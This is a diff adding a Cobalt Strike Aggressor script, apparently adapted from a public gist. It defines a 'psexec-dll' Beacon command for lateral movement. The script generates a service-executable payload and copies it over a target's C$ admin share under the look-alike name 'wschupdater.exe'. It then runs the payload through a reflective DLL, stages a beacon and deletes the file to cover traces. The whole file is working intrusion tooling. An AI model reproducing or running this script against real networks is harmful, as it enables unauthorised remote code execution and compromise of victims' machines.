@@ -1,0 +1,75 @@
+#Pulling from Comexec Lateral Movement Aggressor Script Developed by RSMudge
+#https://gist.github.com/rsmudge/8b2f699ea212c09201a5cb65650c6fa2
+
+beacon_command_register("psexec-dll", "Custom psexec reflective DLL", "Usage: psexec-dll [Target IP] [Listener]");
+
+alias psexec-dll {
+	local('$bid $target $listener');
+	$bid = $1;
+	$target = $2;
+	$listener = $3;
+
+	if($2 is $null)
+	{
+		blog($bid, "No parameters entered");
+		blog($bid, "Usage: psexec-dll [Target IP] [Listener]");
+		exit("Done");
+	}
+
+	if($2 !hasmatch '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
+	{
+		blog($bid, "Use an IP Address");
+		blog($bid, "Usage: psexec-dll [Target IP] [Listener]");
+		exit("Done");
+	}
+	
+	if($3 is $null)
+	{
+		openPayloadHelper(lambda({
+			psexec-dll-go($bid, $target, $1);
+		}, $bid => $1, $target => $2));
+	}
+	else
+	{
+		psexec-dll-go($1, $2, $3)
+	}
+}
+
+sub psexec-dll-go {
+	local('$bid $target $listener');
+	$bid = $1;
+	$target = $2;
+	$listener = $3;
+	$arch = "x86";
+	$dll = getFileProper(script_resource("dll"), "psexec-dll.dll");
+
+	if (listener_info($3) is $null) {
+		berror($1, "Listener $3 does not exist");
+		return;
+	}
+	
+	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3, $2) . ") via psexec");
+	
+	artifact_stageless($listener, "svcexe", $arch, $null, $this);
+	yield;
+
+	$payload = $1;
+
+	if($target is "127.0.0.1")
+	{
+		$filepath = "C:\\Windows\\System32\\wschupdater.exe";
+	}
+	else
+	{
+		$filepath = "\\\\$target\\C$\\Windows\\System32\\wschupdater.exe";
+	}
+
+	bupload_raw!($bid, $filepath, $payload);
+	bdllspawn!($bid, $dll, $target, "psexec via dll", 6000);
+	bstage!($bid, $target, $listener, $arch);
+	brm($bid, $filepath);
+
+	exit("Done");
+}
+
+
